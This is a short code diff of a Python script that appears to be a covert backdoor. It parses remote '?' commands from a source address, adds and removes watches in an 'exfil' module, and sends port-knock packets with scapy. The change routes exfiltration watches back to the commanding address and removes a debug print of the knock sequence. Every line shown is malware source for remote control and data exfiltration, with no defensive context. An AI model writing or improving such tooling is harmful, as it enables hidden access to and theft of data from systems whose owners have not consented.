@@ -68,7 +68,7 @@ def executeCommand(srcAddress, pacType, command):
 	if command == "?exit" or command == "?quit":
 		thread.interrupt_main()
 	elif "?intfA " in command:
-		exfil.addWatch(command[7:])
+		exfil.addWatch(command[7:], srcAddress, pacType)
 	elif "?intfD " in command:
 		exfil.removeWatch(command[7:])
 	elif "?file " in command:
@@ -90,7 +90,6 @@ def sendResults(address, protocol, comm):
 def knockCode(address, protocol, openS):
 	if openS:
 		for k in config.knock:
-			print k
 			packet = IP(dst=address, id=k)
 			if protocol == 'tcp':
 				proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
